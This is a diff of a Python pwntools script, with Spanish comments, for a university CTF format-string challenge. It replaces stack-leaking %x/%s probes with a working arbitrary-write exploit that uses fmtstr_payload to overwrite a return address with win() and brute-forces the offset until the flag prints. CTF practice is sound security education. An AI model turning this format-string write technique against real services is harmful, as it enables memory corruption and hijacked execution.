@@ -1,125 +1,76 @@
 #!/usr/bin/env python3
-"""
-Format String Vulnerability - Basic Format String
-100 pts
 
-Objetivo: Explorar el buffer utilizando format strings
-"""
+from pwn import *
 
-from pwn import remote
-
-def connect():
-    """Conectarse al servidor"""
-    con = remote('ic.catedras.linti.unlp.edu.ar', 15019, timeout=5)
-    return con
-
-def explore_stack():
-    """Explorar la pila con format strings"""
-    con = connect()
+def exploit_format_string():
+    """
+    Format String Vulnerability - Arbitrary Write
+    Sobrescribir dirección de retorno para ejecutar win()
+    """
     
-    print("[*] Banner recibido:")
-    banner = con.recvuntil(b"input:")
-    banner_text = banner.decode(errors='replace')
-    print(banner_text)
+    host = 'ic.catedras.linti.unlp.edu.ar'
+    port = 15019
     
-    # Extraer la dirección del buffer
-    import re
-    match = re.search(r'0x([0-9a-fA-F]+)', banner_text)
-    if match:
-        buffer_addr = f"0x{match.group(1)}"
-        print(f"[+] Buffer detectado en: {buffer_addr}")
+    binary_name = 'reto-bfs'
+    offset_arg = 4
     
-    # Enviar un format string para leer valores de la pila
-    print("\n[*] Enviando format string para explorar la pila...")
-    payload = b"%x.%x.%x.%x.%x.%x.%x.%x.%x.%x"
-    con.sendline(payload)
+    try:
+        elf = ELF(binary_name, checksec=False)
+        win_addr = elf.symbols['win']
+    except:
+        win_addr = 0x080484b4
     
-    respuesta = con.recvall(timeout=3)
-    print("[+] Respuesta (hex de pila):")
-    output = respuesta.decode(errors='replace')
-    print(output)
+    print(f"[+] Win function: {hex(win_addr)}")
+    print(f"[*] Offset: {offset_arg}\n")
     
-    # Convertir a decimal para análisis
-    print("\n[+] Valores en decimal:")
-    values = output.strip().split('.')
-    for i, val in enumerate(values):
+    distancias = [68, 72, 76, 80, 84, 88, 92, 96]
+    
+    for dist in distancias:
         try:
-            dec = int(val, 16)
-            print(f"  [{i}] {val} (hex) = {dec} (dec)")
-        except:
-            print(f"  [{i}] {val} (no hex)")
+            con = remote(host, port, timeout=5)
+            
+            con.recvuntil(b'buffer comienza en: ', timeout=3)
+            leak_line = con.recvline().strip()
+            
+            buffer_addr = int(leak_line, 16)
+            target = buffer_addr + dist
+            
+            print(f"[*] Probando padding {dist}: ", end='', flush=True)
+            
+            payload = fmtstr_payload(offset_arg, {target: win_addr}, write_size='short')
+            
+            if len(payload) > 64:
+                print(f"payload > 64 bytes")
+                con.close()
+                continue
+            
+            con.sendlineafter(b'input:', payload)
+            respuesta = con.recvall(timeout=2)
+            respuesta_text = respuesta.decode(errors='ignore')
+            
+            if "IC{" in respuesta_text:
+                print("¡VULNERABLE!\n")
+                for line in respuesta_text.split('\n'):
+                    if line.strip():
+                        print(f"    {line}")
+                con.close()
+                return
+            
+            print("no")
+            con.close()
+            
+        except Exception as e:
+            print(f"error")
+            try:
+                con.close()
+            except:
+                pass
     
-    con.close()
-    return output
-
-def leak_memory_ascii():
-    """Intentar leer memoria como ASCII"""
-    con = connect()
-    
-    banner = con.recvuntil(b"input:")
-    
-    # %s intenta leer como string (puntero a memoria)
-    print("\n[*] Intentando leer memoria como strings (%s)...")
-    payload = b"%s.%s.%s.%s.%s"
-    con.sendline(payload)
-    
-    try:
-        respuesta = con.recvall(timeout=3)
-        print("[+] Respuesta:")
-        print(respuesta.decode(errors='replace'))
-    except Exception as e:
-        print(f"[-] Error (esperado - puede haber crash): {e}")
-    
-    try:
-        con.close()
-    except:
-        pass
-
-def test_write():
-    """Intentar escribir en memoria"""
-    con = connect()
-    
-    banner = con.recvuntil(b"input:")
-    buffer_addr = banner.decode(errors='replace').split(': ')[1].split('\n')[0]
-    print(f"\n[*] Buffer en: {buffer_addr}")
-    
-    # Construir payload para escribir
-    # Formato: dirección + %n (escribe)
-    try:
-        addr = int(buffer_addr, 16)
-        print(f"[*] Dirección en decimal: {addr}")
-        
-        # Simple test
-        payload = f"%x.%x.%x.%x.%x.%x.%x".encode()
-        con.sendline(payload)
-        
-        respuesta = con.recvall(timeout=3)
-        print("[+] Output:")
-        print(respuesta.decode(errors='replace'))
-    except Exception as e:
-        print(f"[-] Error: {e}")
-    
-    try:
-        con.close()
-    except:
-        pass
+    print("\n[-] Exploit fallido")
 
 if __name__ == "__main__":
-    print("="*70)
-    print("FORMAT STRING VULNERABILITY - EXPLOITATION")
-    print("="*70)
+    print("="*60)
+    print("FORMAT STRING - ARBITRARY WRITE EXPLOIT")
+    print("="*60 + "\n")
     
-    try:
-        # Fase 1: Explorar la pila
-        explore_stack()
-        
-        # Fase 2: Intentar leer memoria
-        leak_memory_ascii()
-        
-        # Fase 3: Intentar escritura
-        test_write()
-        
-    except Exception as e:
-        print(f"[-] Error general: {e}")
-        import traceback
-        traceback.print_exc()
+    exploit_format_string()
